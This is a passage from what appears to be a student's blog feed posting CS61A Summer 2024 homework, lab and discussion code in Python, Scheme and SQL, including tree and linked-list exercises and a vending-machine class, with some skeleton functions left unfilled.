    &gt;&gt;&gt; w = VendingMachine('soda', 2)&#13;
    &gt;&gt;&gt; w.restock(3)&#13;
    'Current soda stock: 3'&#13;
    &gt;&gt;&gt; w.restock(3)&#13;
    'Current soda stock: 6'&#13;
    &gt;&gt;&gt; w.add_funds(2)&#13;
    'Current balance: $2'&#13;
    &gt;&gt;&gt; w.vend()&#13;
    'Here is your soda.'&#13;
    '''&#13;
    def __init__(self, name, price):&#13;
        self.name = name&#13;
        self.price = price&#13;
        self.balance = 0&#13;
        self.inventory = 0&#13;
    def vend(self):&#13;
        if self.inventory == 0:&#13;
            return 'Nothing left to vend. Please restock.'&#13;
        elif self.balance &lt; self.price:&#13;
            return  f'Please add ${self.price - self.balance} more funds.'&#13;
        elif self.balance &gt; self.price:&#13;
            self.inventory -= 1&#13;
            exchange = self.balance - self.price&#13;
            self.balance = 0&#13;
            return f'Here is your {self.name} and ${exchange} change.'&#13;
        else:&#13;
            self.balance = 0&#13;
            self.inventory -= 1&#13;
            return f'Here is your {self.name}.'&#13;
    def add_funds(self, funds):&#13;
        if self.inventory == 0:&#13;
            return f'Nothing left to vend. Please restock. Here is your ${funds}.'&#13;
        else:&#13;
            self.balance += funds&#13;
            return f'Current balance: ${self.balance}'&#13;
    def restock(self, inventory):&#13;
        self.inventory += inventory&#13;
        return f'Current {self.name} stock: {self.inventory}'&#13;
&#13;
# Tree Data Abstraction&#13;
&#13;
def tree(label, branches=[]):&#13;
    '''Construct a tree with the given label value and a list of branches.'''&#13;
    for branch in branches:&#13;
        assert is_tree(branch), 'branches must be trees'&#13;
    return [label] + list(branches)&#13;
&#13;
def label(tree):&#13;
    '''Return the label value of a tree.'''&#13;
    return tree[0]&#13;
&#13;
def branches(tree):&#13;
    '''Return the list of branches of the given tree.'''&#13;
    return tree[1:]&#13;
&#13;
def is_tree(tree):&#13;
    '''Returns True if the given tree is a tree, and False otherwise.'''&#13;
    if type(tree) != list or len(tree) &lt; 1:&#13;
        return False&#13;
    for branch in branches(tree):&#13;
        if not is_tree(branch):&#13;
            return False&#13;
    return True&#13;
&#13;
def is_leaf(tree):&#13;
    '''Returns True if the given tree's list of branches is empty, and False&#13;
    otherwise.&#13;
    '''&#13;
    return not branches(tree)&#13;
&#13;
def print_tree(t, indent=0):&#13;
    '''Print a representation of this tree in which each node is&#13;
    indented by two spaces times its depth from the root.&#13;
&#13;
    &gt;&gt;&gt; print_tree(tree(1))&#13;
    1&#13;
    &gt;&gt;&gt; print_tree(tree(1, [tree(2)]))&#13;
    1&#13;
      2&#13;
    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])&#13;
    &gt;&gt;&gt; print_tree(numbers)&#13;
    1&#13;
      2&#13;
      3&#13;
        4&#13;
        5&#13;
      6&#13;
        7&#13;
    '''&#13;
    print('  ' * indent + str(label(t)))&#13;
    for b in branches(t):&#13;
        print_tree(b, indent + 1)&#13;
&#13;
def copy_tree(t):&#13;
    '''Returns a copy of t. Only for testing purposes.&#13;
&#13;
    &gt;&gt;&gt; t = tree(5)&#13;
    &gt;&gt;&gt; copy = copy_tree(t)&#13;
    &gt;&gt;&gt; t = tree(6)&#13;
    &gt;&gt;&gt; print_tree(copy)&#13;
    5&#13;
    '''&#13;
    return tree(label(t), [copy_tree(b) for b in branches(t)])&#13;
&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## hw05&#13;
&#13;
&#13;
&#13;
```python&#13;
# You do not need to understand what this function does. It is used for testing.&#13;
def make_test_random():&#13;
    '''A deterministic random function that cycles between&#13;
    [0.0, 0.1, 0.2, ..., 0.9] for testing purposes.&#13;
&#13;
    &gt;&gt;&gt; random = make_test_random()&#13;
    &gt;&gt;&gt; random()&#13;
    0.0&#13;
    &gt;&gt;&gt; random()&#13;
    0.1&#13;
    &gt;&gt;&gt; random2 = make_test_random()&#13;
    &gt;&gt;&gt; random2()&#13;
    0.0&#13;
    '''&#13;
    rands = [x / 10 for x in range(10)]&#13;
    def random():&#13;
        rand = rands[0]&#13;
        rands.append(rands.pop(0))&#13;
        return rand&#13;
    return random&#13;
&#13;
### Phase 1: The Player Class&#13;
class Player:&#13;
    '''&#13;
    &gt;&gt;&gt; random = make_test_random()&#13;
    &gt;&gt;&gt; p1 = Player('Hill', random)&#13;
    &gt;&gt;&gt; p2 = Player('Don', random)&#13;
    &gt;&gt;&gt; p1.popularity&#13;
    100&#13;
    &gt;&gt;&gt; p1.debate(p2)  # random() should return 0.0&#13;
    &gt;&gt;&gt; p1.popularity&#13;
    150&#13;
    &gt;&gt;&gt; p2.popularity&#13;
    100&#13;
    &gt;&gt;&gt; p2.votes&#13;
    0&#13;
    &gt;&gt;&gt; p2.speech(p1)&#13;
    &gt;&gt;&gt; p2.votes&#13;
    10&#13;
    &gt;&gt;&gt; p2.popularity&#13;
    110&#13;
    &gt;&gt;&gt; p1.popularity&#13;
    135&#13;
    &gt;&gt;&gt; p1.speech(p2)&#13;
    &gt;&gt;&gt; p1.votes&#13;
    13&#13;
    &gt;&gt;&gt; p1.popularity&#13;
    148&#13;
    &gt;&gt;&gt; p2.votes&#13;
    10&#13;
    &gt;&gt;&gt; p2.popularity&#13;
    99&#13;
    &gt;&gt;&gt; for _ in range(4):  # 0.1, 0.2, 0.3, 0.4&#13;
    ...     p1.debate(p2)&#13;
    &gt;&gt;&gt; p2.debate(p1)&#13;
    &gt;&gt;&gt; p2.popularity&#13;
    49&#13;
    &gt;&gt;&gt; p2.debate(p1)&#13;
    &gt;&gt;&gt; p2.popularity&#13;
    0&#13;
    '''&#13;
    def __init__(self, name, random_func):&#13;
        self.name = name&#13;
        self.votes = 0&#13;
        self.popularity = 100&#13;
        self.random_func = random_func&#13;
&#13;
    def debate(self, other):&#13;
        if self.random_func() &lt; max(0.1, self.popularity / (self.popularity + other.popularity)):&#13;
            self.popularity += 50&#13;
        else:&#13;
            self.popularity = max(0, self.popularity - 50)&#13;
&#13;
&#13;
    def speech(self, other):&#13;
        self.votes += self.popularity // 10&#13;
        self.popularity += self.popularity // 10&#13;
       &#13;
        other.popularity -= other.popularity // 10&#13;
    def choose(self, other):&#13;
        return self.speech&#13;
&#13;
&#13;
### Phase 2: The Game Class&#13;
class Game:&#13;
    '''&#13;
    &gt;&gt;&gt; random = make_test_random()&#13;
    &gt;&gt;&gt; p1, p2 = Player('Hill',random), Player('Don', random)&#13;
    &gt;&gt;&gt; g = Game(p1, p2)&#13;
    &gt;&gt;&gt; winner = g.play()&#13;
    &gt;&gt;&gt; p1 is winner&#13;
    True&#13;
    &gt;&gt;&gt; # Additional correctness tests&#13;
    &gt;&gt;&gt; winner is g.winner()&#13;
    True&#13;
    &gt;&gt;&gt; g.turn&#13;
    10&#13;
    &gt;&gt;&gt; p1.votes = p2.votes&#13;
    &gt;&gt;&gt; print(g.winner())&#13;
    None&#13;
    '''&#13;
    def __init__(self, player1, player2):&#13;
        self.p1 = player1&#13;
        self.p2 = player2&#13;
        self.turn = 0&#13;
&#13;
    def play(self):&#13;
        while not self.game_over():&#13;
            '*** YOUR CODE HERE ***'&#13;
        return self.winner()&#13;
&#13;
    def game_over(self):&#13;
        return max(self.p1.votes, self.p2.votes) &gt;= 50 or self.turn &gt;= 10&#13;
&#13;
    def winner(self):&#13;
        '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
### Phase 3: New Players&#13;
class AggressivePlayer(Player):&#13;
    '''&#13;
    &gt;&gt;&gt; random = make_test_random()&#13;
    &gt;&gt;&gt; p1, p2 = AggressivePlayer('Don', random), Player('Hill', random)&#13;
    &gt;&gt;&gt; g = Game(p1, p2)&#13;
    &gt;&gt;&gt; winner = g.play()&#13;
    &gt;&gt;&gt; p1 is winner&#13;
    True&#13;
    &gt;&gt;&gt; # Additional correctness tests&#13;
    &gt;&gt;&gt; p1.popularity = p2.popularity&#13;
    &gt;&gt;&gt; p1.choose(p2) == p1.debate&#13;
    True&#13;
    &gt;&gt;&gt; p1.popularity += 1&#13;
    &gt;&gt;&gt; p1.choose(p2) == p1.debate&#13;
    False&#13;
    &gt;&gt;&gt; p2.choose(p1) == p2.speech&#13;
    True&#13;
    '''&#13;
    def choose(self, other):&#13;
        '*** YOUR CODE HERE ***'&#13;
&#13;
class CautiousPlayer(Player):&#13;
    '''&#13;
    &gt;&gt;&gt; random = make_test_random()&#13;
    &gt;&gt;&gt; p1, p2 = CautiousPlayer('Hill', random), AggressivePlayer('Don', random)&#13;
    &gt;&gt;&gt; p1.popularity = 0&#13;
    &gt;&gt;&gt; p1.choose(p2) == p1.debate&#13;
    True&#13;
    &gt;&gt;&gt; p1.popularity = 1&#13;
    &gt;&gt;&gt; p1.choose(p2) == p1.debate&#13;
    False&#13;
    &gt;&gt;&gt; # Additional correctness tests&#13;
    &gt;&gt;&gt; p2.choose(p1) == p2.speech&#13;
    True&#13;
    '''&#13;
    def choose(self, other):&#13;
        '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
def add_d_leaves(t, v):&#13;
    '''Add d leaves containing v to each node at every depth d.&#13;
&#13;
    &gt;&gt;&gt; t_one_to_four = Tree(1, [Tree(2), Tree(3, [Tree(4)])])&#13;
    &gt;&gt;&gt; print(t_one_to_four)&#13;
    1&#13;
      2&#13;
      3&#13;
        4&#13;
    &gt;&gt;&gt; add_d_leaves(t_one_to_four, 5)&#13;
    &gt;&gt;&gt; print(t_one_to_four)&#13;
    1&#13;
      2&#13;
        5&#13;
      3&#13;
        4&#13;
          5&#13;
          5&#13;
        5&#13;
&#13;
    &gt;&gt;&gt; t0 = Tree(9)&#13;
    &gt;&gt;&gt; add_d_leaves(t0, 4)&#13;
    &gt;&gt;&gt; t0&#13;
    Tree(9)&#13;
    &gt;&gt;&gt; t1 = Tree(1, [Tree(3)])&#13;
    &gt;&gt;&gt; add_d_leaves(t1, 4)&#13;
    &gt;&gt;&gt; t1&#13;
    Tree(1, [Tree(3, [Tree(4)])])&#13;
    &gt;&gt;&gt; t2 = Tree(2, [Tree(5), Tree(6)])&#13;
    &gt;&gt;&gt; t3 = Tree(3, [t1, Tree(0), t2])&#13;
    &gt;&gt;&gt; print(t3)&#13;
    3&#13;
      1&#13;
        3&#13;
          4&#13;
      0&#13;
      2&#13;
        5&#13;
        6&#13;
    &gt;&gt;&gt; add_d_leaves(t3, 10)&#13;
    &gt;&gt;&gt; print(t3)&#13;
    3&#13;
      1&#13;
        3&#13;
          4&#13;
            10&#13;
            10&#13;
            10&#13;
          10&#13;
          10&#13;
        10&#13;
      0&#13;
        10&#13;
      2&#13;
        5&#13;
          10&#13;
          10&#13;
        6&#13;
          10&#13;
          10&#13;
        10&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
def level_mutation_link(t, funcs):&#13;
	'''Mutates t using the functions in the linked list funcs.&#13;
&#13;
	&gt;&gt;&gt; t = Tree(1, [Tree(2, [Tree(3)])])&#13;
	&gt;&gt;&gt; funcs = Link(lambda x: x + 1, Link(lambda y: y * 5, Link(lambda z: z ** 2)))&#13;
	&gt;&gt;&gt; level_mutation_link(t, funcs)&#13;
	&gt;&gt;&gt; t    # At level 0, apply x + 1; at level 1, apply y * 5; at level 2 (leaf), apply z ** 2&#13;
	Tree(2, [Tree(10, [Tree(9)])])&#13;
	&gt;&gt;&gt; t2 = Tree(1, [Tree(2), Tree(3, [Tree(4)])])&#13;
	&gt;&gt;&gt; level_mutation_link(t2, funcs)&#13;
	&gt;&gt;&gt; t2    # Level 0: 1+1=2; Level 1: 2*5=10 =&gt; 10**2 = 100, 3*5=15; Level 2 (leaf): 4**2=16&#13;
	Tree(2, [Tree(100), Tree(15, [Tree(16)])])&#13;
	&gt;&gt;&gt; t3 = Tree(1, [Tree(2)])&#13;
	&gt;&gt;&gt; level_mutation_link(t3, funcs)&#13;
	&gt;&gt;&gt; t3    # Level 0: 1+1=2; Level 1: 2*5=10; no further levels, so apply remaining z ** 2: 10**2=100&#13;
	Tree(2, [Tree(100)])&#13;
	'''&#13;
	if _____________________:&#13;
		return&#13;
	t.label = _____________________&#13;
	remaining = _____________________&#13;
	if __________________ and __________________:&#13;
		while _____________________:&#13;
			_____________________&#13;
			remaining = remaining.rest&#13;
	for b in t.branches:&#13;
		_____________________&#13;
&#13;
&#13;
def store_digits(n):&#13;
    '''Stores the digits of a positive number n in a linked list.&#13;
&#13;
    &gt;&gt;&gt; s = store_digits(1)&#13;
    &gt;&gt;&gt; s&#13;
    Link(1)&#13;
    &gt;&gt;&gt; store_digits(2345)&#13;
    Link(2, Link(3, Link(4, Link(5))))&#13;
    &gt;&gt;&gt; store_digits(876)&#13;
    Link(8, Link(7, Link(6)))&#13;
    &gt;&gt;&gt; store_digits(2450)&#13;
    Link(2, Link(4, Link(5, Link(0))))&#13;
    &gt;&gt;&gt; # a check for restricted functions&#13;
    &gt;&gt;&gt; import inspect, re&#13;
    &gt;&gt;&gt; cleaned = re.sub(r'#.*\\n', '', re.sub(r''{3}[\s\S]*?'{3}', '', inspect.getsource(store_digits)))&#13;
    &gt;&gt;&gt; print('Do not use str or reversed!') if any([r in cleaned for r in ['str', 'reversed']]) else None&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
def deep_map_mut(func, lnk):&#13;
    '''Mutates a deep link lnk by replacing each item found with the&#13;
    result of calling func on the item. Does NOT create new Links (so&#13;
    no use of Link's constructor).&#13;
&#13;
    Does not return the modified Link object.&#13;
&#13;
    &gt;&gt;&gt; link1 = Link(3, Link(Link(4), Link(5, Link(6))))&#13;
    &gt;&gt;&gt; print(link1)&#13;
    &lt;3 &lt;4&gt; 5 6&gt;&#13;
    &gt;&gt;&gt; # Disallow the use of making new Links before calling deep_map_mut&#13;
    &gt;&gt;&gt; Link.__init__, hold = lambda *args: print('Do not create any new Links.'), Link.__init__&#13;
    &gt;&gt;&gt; try:&#13;
    ...     deep_map_mut(lambda x: x * x, link1)&#13;
    ... finally:&#13;
    ...     Link.__init__ = hold&#13;
    &gt;&gt;&gt; print(link1)&#13;
    &lt;9 &lt;16&gt; 25 36&gt;&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
&#13;
def crispr_gene_insertion(lnk_of_genes, insert):&#13;
    '''Takes a linked list of genes and mutates the genes with the INSERT codon added the correct number of times.&#13;
&#13;
    &gt;&gt;&gt; link = Link(Link('AUG', Link('GCC', Link('ACG'))), Link(Link('ATG', Link('AUG', Link('ACG', Link('GCC'))))))&#13;
    &gt;&gt;&gt; print(link)&#13;
    &lt;&lt;AUG GCC ACG&gt; &lt;ATG AUG ACG GCC&gt;&gt;&#13;
    &gt;&gt;&gt; crispr_gene_insertion(link, 'TTA')&#13;
    &gt;&gt;&gt; print(link)&#13;
    &lt;&lt;AUG TTA GCC ACG&gt; &lt;ATG AUG TTA TTA ACG GCC&gt;&gt;&#13;
    &gt;&gt;&gt; link = Link(Link('ATG'), Link(Link('AUG', Link('AUG')), Link(Link('AUG', Link('GCC')))))&#13;
    &gt;&gt;&gt; print(link)&#13;
    &lt;&lt;ATG&gt; &lt;AUG AUG&gt; &lt;AUG GCC&gt;&gt;&#13;
    &gt;&gt;&gt; crispr_gene_insertion(link, 'TTA') # first gene has no AUG so unchanged, 2nd gene has 2 AUGs but only first considered for insertion&#13;
    &gt;&gt;&gt; print(link)&#13;
    &lt;&lt;ATG&gt; &lt;AUG TTA TTA AUG&gt; &lt;AUG TTA TTA TTA GCC&gt;&gt;&#13;
    &gt;&gt;&gt; link = Link.empty # empty linked list of genes stays empty&#13;
    &gt;&gt;&gt; crispr_gene_insertion(link, 'TTA')&#13;
    &gt;&gt;&gt; print(link)&#13;
    ()&#13;
    '''&#13;
    '*** YOUR CODE HERE ***'&#13;
&#13;
def transcribe(dna):&#13;
    '''Takes a string of DNA and returns a Python list with the RNA codons.&#13;
&#13;
    &gt;&gt;&gt; DNA = 'TACCTAGCCCATAAA'&#13;
    &gt;&gt;&gt; transcribe(DNA)&#13;
    ['AUG', 'GAU', 'CGG', 'GUA', 'UUU']&#13;
    '''&#13;
    dict = {'A': 'U', 'T': 'A', 'G': 'C', 'C': 'G'}&#13;
    return __________________&#13;
&#13;
&#13;
class Tree:&#13;
    '''&#13;
    &gt;&gt;&gt; t = Tree(3, [Tree(2, [Tree(5)]), Tree(4)])&#13;
    &gt;&gt;&gt; t.label&#13;
    3&#13;
    &gt;&gt;&gt; t.branches[0].label&#13;
    2&#13;
    &gt;&gt;&gt; t.branches[1].is_leaf()&#13;
    True&#13;
    '''&#13;
    def __init__(self, label, branches=[]):&#13;
        for b in branches:&#13;
            assert isinstance(b, Tree)&#13;
        self.label = label&#13;
        self.branches = list(branches)&#13;
&#13;
    def is_leaf(self):&#13;
        return not self.branches&#13;
&#13;
    def __repr__(self):&#13;
        if self.branches:&#13;
            branch_str = ', ' + repr(self.branches)&#13;
        else:&#13;
            branch_str = ''&#13;
        return 'Tree({0}{1})'.format(self.label, branch_str)&#13;
&#13;
    def __str__(self):&#13;
        def print_tree(t, indent=0):&#13;
            tree_str = '  ' * indent + str(t.label) + '\n'&#13;
            for b in t.branches:&#13;
                tree_str += print_tree(b, indent + 1)&#13;
            return tree_str&#13;
        return print_tree(self).rstrip()&#13;
&#13;
&#13;
class Link:&#13;
    '''A linked list.&#13;
&#13;
    &gt;&gt;&gt; s = Link(1)&#13;
    &gt;&gt;&gt; s.first&#13;
    1&#13;
    &gt;&gt;&gt; s.rest is Link.empty&#13;
    True&#13;
    &gt;&gt;&gt; s = Link(2, Link(3, Link(4)))&#13;
    &gt;&gt;&gt; s.first = 5&#13;
    &gt;&gt;&gt; s.rest.first = 6&#13;
    &gt;&gt;&gt; s.rest.rest = Link.empty&#13;
    &gt;&gt;&gt; s                                    # Displays the contents of repr(s)&#13;
    Link(5, Link(6))&#13;
    &gt;&gt;&gt; s.rest = Link(7, Link(Link(8, Link(9))))&#13;
    &gt;&gt;&gt; s&#13;
    Link(5, Link(7, Link(Link(8, Link(9)))))&#13;
    &gt;&gt;&gt; print(s)                             # Prints str(s)&#13;
    &lt;5 7 &lt;8 9&gt;&gt;&#13;
    '''&#13;
    empty = ()&#13;
&#13;
    def __init__(self, first, rest=empty):&#13;
        assert rest is Link.empty or isinstance(rest, Link)&#13;
        self.first = first&#13;
        self.rest = rest&#13;
&#13;
    def __repr__(self):&#13;
        if self.rest is not Link.empty:&#13;
            rest_repr = ', ' + repr(self.rest)&#13;
        else:&#13;
            rest_repr = ''&#13;
        return 'Link(' + repr(self.first) + rest_repr + ')'&#13;
&#13;
    def __str__(self):&#13;
        string = '&lt;'&#13;
        while self.rest is not Link.empty:&#13;
            string += str(self.first) + ' '&#13;
            self = self.rest&#13;
        return string + str(self.first) + '&gt;'&#13;
 &#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## hw06&#13;
&#13;
&#13;
&#13;
```scheme&#13;
(define (square n) (* n n))&#13;
&#13;
(define (pow base exp) &#13;
  (cond &#13;
    ((= exp 1) base)&#13;
    ((= exp 2) (square base))&#13;
    ((even? (modulo exp 2)) (square (pow base (quotient exp 2))))&#13;
    (else (* base (square (pow base (quotient exp 2)))))&#13;
  )&#13;
)&#13;
&#13;
(define (repeatedly-cube n x)&#13;
  (if (zero? n)&#13;
      x&#13;
      (let ((y (repeatedly-cube (- n 1) x)))&#13;
        (* y y y)&#13;
      )&#13;
  )&#13;
)&#13;
&#13;
(define (cddr s) (cdr (cdr s)))&#13;
&#13;
(define (cadr s) (car (cdr s)))&#13;
&#13;
(define (caddr s) (car (cdr (cdr s))))&#13;
&#13;
(define (ascending? s) &#13;
  (cond &#13;
    ((or (null? s) (null? (cdr s))) #t)&#13;
    ((&gt; (car s) (cadr s)) #f)&#13;
    (else (ascending? (cdr s)))&#13;
  )&#13;
)&#13;
&#13;
(define (my-filter pred s)&#13;
  (cond &#13;
    ((null? s) s)&#13;
    ((pred (car s)) &#13;
      (cons (car s) (my-filter pred (cdr s)))&#13;
    )&#13;
    (else (my-filter pred (cdr s)))&#13;
  )&#13;
)&#13;
(define (no-repeats s) &#13;
  (cond&#13;
    ((null? s) s)&#13;
    ((null? (cdr s)) s)&#13;
    (else (cons (car s) (no-repeats (my-filter (lambda (x) (not (= x (car s)))) (cdr s)))))&#13;
  )&#13;
)&#13;
; helper function&#13;
; returns the values of lst that are bigger than x&#13;
; e.g., (larger-values 3 '(1 2 3 4 5 1 2 3 4 5)) --&gt; (4 5 4 5)&#13;
(define (larger-values x lst)&#13;
  (cond &#13;
    ((null? lst) lst)&#13;
    ((&lt; x (car lst)) (cons (car lst) (larger-values x (cdr lst))))&#13;
    (else (larger-values x (cdr lst)))&#13;
  )&#13;
)&#13;
(define (longest-increasing-subsequence lst)&#13;
  (if (null? lst)&#13;
      nil&#13;
      (begin (define first (car lst))&#13;
             (define rest (cdr lst))&#13;
             (define large-values-rest&#13;
                    (larger-values first rest)&#13;
             )&#13;
             (define with-first&#13;
                (cons first (longest-increasing-subsequence large-values-rest)&#13;
                )&#13;
             )&#13;
             (define without-first&#13;
                  (longest-increasing-subsequence rest)&#13;
              )&#13;
            (if (&gt; (length with-first) (length without-first))&#13;
                 with-first&#13;
                 without-first&#13;
            )&#13;
      )&#13;
  )&#13;
)&#13;
(define (sqrt x)&#13;
  (define (good-enough? guess)&#13;
    (&lt; (abs (- (square guess) x)) 0.001))&#13;
  (define (improve guess)&#13;
    (average guess (/ x guess)))&#13;
  (define (sqrt-iter guess)&#13;
    (if (good-enough? guess)&#13;
        guess&#13;
        (sqrt-iter (improve guess))))&#13;
  (sqrt-iter 1.0))&#13;
(sqrt 9)&#13;
```&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
## hw07&#13;
&#13;
&#13;
&#13;
```scheme&#13;
(define (add-leaf t x)&#13;
  (if (is-leaf t)&#13;
      (tree (label t) nil)&#13;
      (begin (define mapped-branches&#13;
                (map  (lambda (b) (add-leaf b x))&#13;
                      (branches t)&#13;
                )&#13;
             )&#13;
            (tree (label t)&#13;
              (append mapped-branches (list (tree x nil)))&#13;
            )&#13;
      )&#13;
  )&#13;
)&#13;
```&#13;
&#13;
&#13;
&#13;
```sqlite&#13;
CREATE TABLE parents AS&#13;
  SELECT 'abraham' AS parent, 'barack' AS child UNION&#13;
  SELECT 'abraham'          , 'clinton'         UNION&#13;
  SELECT 'delano'           , 'herbert'         UNION&#13;
  SELECT 'fillmore'         , 'abraham'         UNION&#13;
  SELECT 'fillmore'         , 'delano'          UNION&#13;
  SELECT 'fillmore'         , 'grover'          UNION&#13;
  SELECT 'eisenhower'       , 'fillmore';&#13;
&#13;
CREATE TABLE dogs AS&#13;
  SELECT 'abraham' AS name, 'long' AS fur, 26 AS height UNION&#13;
  SELECT 'barack'         , 'short'      , 52           UNION&#13;
  SELECT 'clinton'        , 'long'       , 47           UNION&#13;
  SELECT 'delano'         , 'long'       , 46           UNION&#13;
  SELECT 'eisenhower'     , 'short'      , 35           UNION&#13;
  SELECT 'fillmore'       , 'curly'      , 32           UNION&#13;
  SELECT 'grover'         , 'short'      , 28           UNION&#13;
  SELECT 'herbert'        , 'curly'      , 31;&#13;
&#13;
CREATE TABLE sizes AS&#13;
  SELECT 'toy' AS size, 24 AS min, 28 AS max UNION&#13;
  SELECT 'mini'       , 28       , 35        UNION&#13;
  SELECT 'medium'     , 35       , 45        UNION&#13;
  SELECT 'standard'   , 45       , 60;&#13;
&#13;
&#13;
-- All dogs with parents ordered by decreasing height of their parent&#13;
CREATE TABLE by_parent_height AS&#13;
  SELECT child FROM parents, dogs WHERE name = parent ORDER BY height desc;&#13;
&#13;
-- The size of each dog&#13;
CREATE TABLE size_of_dogs AS&#13;
&#13;
SELECT name, size FROM dogs, sizes&#13;
    WHERE height &gt; min AND height &lt;= max;&#13;
-- Filling out this helper table is optional&#13;
CREATE TABLE siblings AS&#13;
  SELECT a.child AS first, b.child AS second FROM parents AS a, parents AS b&#13;
      WHERE a.parent = b.parent AND a.child &lt; b.child;&#13;
-- Sentences about siblings that are the same size&#13;
CREATE TABLE sentences AS&#13;
  SELECT 'The two siblings, ' || first || ' and ' || second || ', have the same size: ' || a.size&#13;
      FROM siblings, size_of_dogs AS a, size_of_dogs AS b&#13;
      WHERE a.size = b.size AND a.name = first AND b.name = second;&#13;
&#13;
-- Height range for each fur type where all of the heights differ by no more than 30% from the average height&#13;
CREATE TABLE low_variance AS&#13;
  SELECT  fur, max(height) - min(height) &#13;
  from dogs &#13;
  group by fur &#13;
  having MIN(height) &gt;= .7 * AVG(height) AND MAX(height) &lt;= 1.3 * AVG(height) ;&#13;
```&#13;
&#13;
。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-hw.html</guid><pubDate>Wed, 28 Aug 2024 09:48:09 +0000</pubDate></item><item><title>cs61a-su24-lab09</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-lab09.html</link><description>``` python&#13;
&#13;
(define (over-or-under num1 num2) &#13;
      (cond ((= num1 num2) 0)&#13;
            ((&lt; num1 num2) -1)&#13;
            ((&gt; num1 num2) 1)&#13;
      )&#13;
)&#13;
(define (make-adder num) (lambda (incr) (+ num incr)))&#13;
&#13;
(define (composed f g) (lambda (x) (f (g x))))&#13;
&#13;
(define (repeat f n) (lambda (x) (if (= n 0) x ((repeat f (- n 1)) (f x)))))&#13;
&#13;
(define (max a b)&#13;
  (if (&gt; a b)&#13;
      a&#13;
      b))&#13;
&#13;
(define (min a b)&#13;
  (if (&gt; a b)&#13;
      b&#13;
      a))&#13;
&#13;
(define (gcd a b) (if (= 0 (modulo (max a b) (min a b))) (min a b) (gcd (min a b) (modulo (max a b) (min a b)))))&#13;
&#13;
(define (duplicate lst) &#13;
  (if (null? lst)&#13;
    lst&#13;
    (cons (car lst)&#13;
          (cons (car lst) &#13;
                (duplicate (cdr lst))&#13;
          )&#13;
    )&#13;
  )&#13;
)&#13;
&#13;
(expect (duplicate '(1 2 3)) (1 1 2 2 3 3))&#13;
&#13;
(expect (duplicate '(1 1)) (1 1 1 1))&#13;
&#13;
(define (deep-map fn s) &#13;
    (cond ((null? s) s) &#13;
          ((list? (car s)) (cons (deep-map fn (car s)) (deep-map fn (cdr s)))) &#13;
          (else (cons (fn (car s)) (deep-map fn (cdr s)))) &#13;
))&#13;
&#13;
```。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-lab09.html</guid><pubDate>Tue, 27 Aug 2024 08:31:21 +0000</pubDate></item><item><title>cs61a-su24-lab09</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-lab09.html</link><description>``` python&#13;
&#13;
(define (over-or-under num1 num2) &#13;
      (cond ((= num1 num2) 0)&#13;
            ((&lt; num1 num2) -1)&#13;
            ((&gt; num1 num2) 1)&#13;
      )&#13;
)&#13;
(define (make-adder num) (lambda (incr) (+ num incr)))&#13;
&#13;
(define (composed f g) (lambda (x) (f (g x))))&#13;
&#13;
(define (repeat f n) (lambda (x) (if (= n 0) x ((repeat f (- n 1)) (f x)))))&#13;
&#13;
(define (max a b)&#13;
  (if (&gt; a b)&#13;
      a&#13;
      b))&#13;
&#13;
(define (min a b)&#13;
  (if (&gt; a b)&#13;
      b&#13;
      a))&#13;
&#13;
(define (gcd a b) (if (= 0 (modulo (max a b) (min a b))) (min a b) (gcd (min a b) (modulo (max a b) (min a b)))))&#13;
&#13;
(define (duplicate lst) &#13;
  (if (null? lst)&#13;
    lst&#13;
    (cons (car lst)&#13;
          (cons (car lst) &#13;
                (duplicate (cdr lst))&#13;
          )&#13;
    )&#13;
  )&#13;
)&#13;
&#13;
(expect (duplicate '(1 2 3)) (1 1 2 2 3 3))&#13;
&#13;
(expect (duplicate '(1 1)) (1 1 1 1))&#13;
&#13;
(define (deep-map fn s) &#13;
    (cond ((null? s) s) &#13;
          ((list? (car s)) (cons (deep-map fn (car s)) (deep-map fn (cdr s)))) &#13;
          (else (cons (fn (car s)) (deep-map fn (cdr s)))) &#13;
))&#13;
&#13;
```。</description><guid isPermaLink="true">https://LianSeKong.github.io/lizi/post/cs61a-su24-lab09.html</guid><pubDate>Tue, 27 Aug 2024 08:26:09 +0000</pubDate></item><item><title>cs61a-su24-disc01</title><link>https://LianSeKong.github.io/lizi/post/cs61a-su24-disc01.html</link><description>``` python&#13;
from math import sqrt&#13;
&#13;
# positive integer: 大于0的整数&#13;
&#13;
#Q1: Race&#13;
#The race function below sometimes returns the wrong value and sometimes runs forever.&#13;
&#13;
def race(x, y):&#13;
    '''The tortoise always walks x feet per minute, while the hare repeatedly&#13;
    runs y feet per minute for 5 minutes, then rests for 5 minutes. Return how&#13;
    many minutes pass until the tortoise first catches up to the hare.&#13;
&#13;
    &gt;&gt;&gt; race(5, 7)  # After 7 minutes, both have gone 35 steps&#13;
    7&#13;
    &gt;&gt;&gt; race(2, 4) # After 10 minutes, both have gone 20 steps&#13;
    10&#13;
    '''&#13;
    assert y &gt; x and y &lt;= 2 * x, 'the hare must be fast but not too fast'&#13;
    tortoise, hare, minutes = 0, 0, 0&#13;
    while minutes == 0 or tortoise - hare:&#13;
        tortoise += x&#13;
        if minutes % 10 &lt; 5:&#13;
            hare += y&#13;
        minutes += 1&#13;
    return minutes&#13;
&#13;
&#13;
# x &lt;= (y - x) * 5 &lt;= 5x &#13;
#  1. 6x&lt;=5y&#13;
#  3. y &lt;= 2x&#13;
# Example: 9 10&#13;
&#13;
&#13;
# Q2: Fizzbuzz&#13;
&#13;
def fizzbuzz(n):&#13;
    '''&#13;
    &gt;&gt;&gt; result = fizzbuzz(16)&#13;
    1&#13;
    2&#13;
    fizz&#13;
    4&#13;
    buzz&#13;
    fizz&#13;
    7&#13;
    8&#13;
